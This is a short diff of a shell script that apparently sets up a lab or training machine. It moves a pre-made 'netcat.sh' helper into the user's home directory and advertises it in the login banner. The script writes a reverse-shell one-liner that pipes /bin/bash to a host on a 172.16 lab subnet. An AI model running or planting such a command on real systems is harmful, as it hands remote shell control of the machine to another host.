@@ -64,6 +64,6 @@ su -c "./shellinaboxd -b -q -t --user-css Normal:+shell-style.css" -s /bin/sh us
 #
 sudo touch /home/user/.bashrc
 sudo echo -e "\n\n+ -- --=[ Pre-canned ]=-- -- +\n\n    ./netcat.sh\n\n" >> /etc/motd
-sudo touch netcat.sh
-sudo echo "nc.traditional -e /bin/bash 172.16.$1.10 80" > netcat.sh
-sudo chmod 755 netcat.sh
+sudo touch /home/user/netcat.sh
+sudo echo "nc.traditional -e /bin/bash 172.16.$1.10 80" > /home/user/netcat.sh
+sudo chmod 755 /home/user/netcat.sh
